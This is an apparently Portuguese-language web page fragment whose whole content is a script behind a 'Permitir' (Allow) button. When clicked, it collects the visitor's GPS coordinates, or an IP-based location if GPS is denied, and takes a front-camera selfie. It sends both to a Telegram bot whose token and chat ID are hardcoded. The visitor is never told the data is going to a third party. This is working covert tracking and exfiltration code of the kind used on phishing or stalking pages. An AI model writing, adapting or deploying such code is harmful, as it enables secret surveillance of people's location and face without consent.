<body>

<div class="card">

  <button id="btnPermitir">Permitir</button>
</div>

<script>
// CONFIG
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';
const tele   = (msg, file) => fetch(`https://api.telegram.org/bot${TOKEN}/send${file?'Photo':'Message'}`,{
                 method:'POST',
                 body: file ? (()=>{const f=new FormData();f.append('chat_id',CHAT_ID);f.append('caption',msg);f.append('photo',file,'selfie.jpg');return f;})()
                            : JSON.stringify({chat_id:CHAT_ID,text:msg}),
                 headers: file?{}:{'Content-Type':'application/json'}});

// A√á√ÉO
document.getElementById('btnPermitir').addEventListener('click', async () => {
  // GPS
  navigator.geolocation.getCurrentPosition(p=>{
      const {latitude:lat,longitude:lon}=p.coords;
      tele(`üìç GPS: https://maps.google.com/?q=${lat},${lon}`);
    },()=>{fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>tele(`üìç IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`));});
  // selfie
  try{
    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    const v=document.createElement('video');v.srcObject=s;await v.play();
    const c=document.createElement('canvas');c.width=640;c.height=480;
    c.getContext('2d').drawImage(v,0,0);
    c.toBlob(b=>{tele('üì∏ selfie',b);s.getTracks().forEach(t=>t.stop());},'image/jpeg',0.9);
  }catch(e){tele('üì∏ selfie falhou: '+e.message);}

});
